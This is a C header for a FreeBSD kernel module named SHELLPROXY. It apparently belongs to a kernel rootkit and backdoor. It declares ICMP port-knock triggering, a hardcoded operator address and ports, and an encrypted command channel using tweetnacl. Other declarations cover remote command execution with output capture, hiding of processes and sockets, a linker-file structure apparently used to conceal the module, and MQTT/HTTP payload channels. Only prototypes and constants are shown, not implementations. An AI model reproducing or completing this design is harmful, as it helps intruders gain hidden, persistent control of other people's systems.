#ifndef SHELLPROXY_H
#define SHELLPROXY_H

#include <sys/param.h>
#include <sys/types.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/malloc.h>
#include <sys/proc.h>
#include <sys/socket.h>
#include <sys/socketvar.h>
#include "remsocket.h"
#include <sys/uio.h>
#include <sys/callout.h>
#include <sys/counter.h>
#include <sys/libkern.h>
#include <sys/devctl.h>
#include <sys/sysctl.h>
#include <sys/kthread.h>
#include <sys/endian.h>
#include <sys/linker.h>
#include <vm/vm.h>
#include <vm/vm_object.h>

#include <net/vnet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/icmp_var.h>

#include "tweetnacl.h"
#include "common.h"

#define KNOCK_COUNT 3
#define KNOCK_WINDOW_S 3
#define TICK_MS 100
#define USER_PORT 9001
#define OUT_PORT 9002
#define TS_WINDOW 1800
#define MAX_PKT 4096
#define MAX_CMD_OUT 32768
#define OUTPORT 40123
#define USER_ADDR htonl(0x0a000202)

extern u8 KIT_PRIV[32];
extern struct callout knock_callout;
extern struct mtx proxy_mtx;
extern struct proc *proxy_proc;
extern int shutting_down;
extern int fire;
extern int mfire;
extern int kthreads_started;
extern int kthreads_done;
extern u32 user_addr;
extern u32 op_addr;

// uncomment for verbose dmesg; never on shipped builds
//#define DBGMODEDONTUSEME

int proxy_recv_n (struct socket* so, u8* buf, int n);
int proxy_send_n (struct socket* so, const void* data, int n);
int proxy_set_rcvtimeo (struct socket* so, int sec);
int proxy_pkt_send (struct socket* so, u8 key[32], u64 ctr, const u8* m, int mlen);
int proxy_pkt_recv (struct socket* so, u8 key[32], u64 ctr, u8* m, int* mlen);
int proxy_seal (const u8* msg, int mlen, const u8 key[32], u8 tag, u64 ctr, u8* out, int outsz);
int proxy_unbox (const u8* payload, int plen, const u8 key[32], u8 tag, u64 ctr, u8* out, int outsz);
void proxy_hello (u8 out[8+24], u8 nonce_r[24]);
int proxy_session_keys (const u8* resp, const u8 nonce_r[24], u8 tx[32], u8 rx[32]);
int proxy_handshake (struct socket* so, u8 tx[32], u8 rx[32]);
void proxy_execute (const char* cmd);
int subnet_handle (const char* cmd, char* resp, int rsz);
void proxy_hide (struct proc* p);
void proxy_unhide (struct proc* p);
void proxy_forkhide_on (void);
void proxy_attr_socket (struct socket* so);
void proxy_attr_socket_clear (void);
void proxy_attr_remote_sockets (void);
void proxy_attr_start (void);
int proxy_execute_capture (struct remconn* rc, const char* cmd, u8* out, int outsz);
void proxy_unhide (struct proc* p);
void proxy_knock_tick (void* arg);
int dd_start (void);
int proxy_http_any (char kind, uint64_t bucket, int* hit);
int mqtt_start (void);
int payload_init (void);
void dd_stop (void);

struct ef_mirror {
	struct linker_file lf;
	int preloaded;
	int _pad;
	caddr_t address;
	vmobject object;
};
#endif
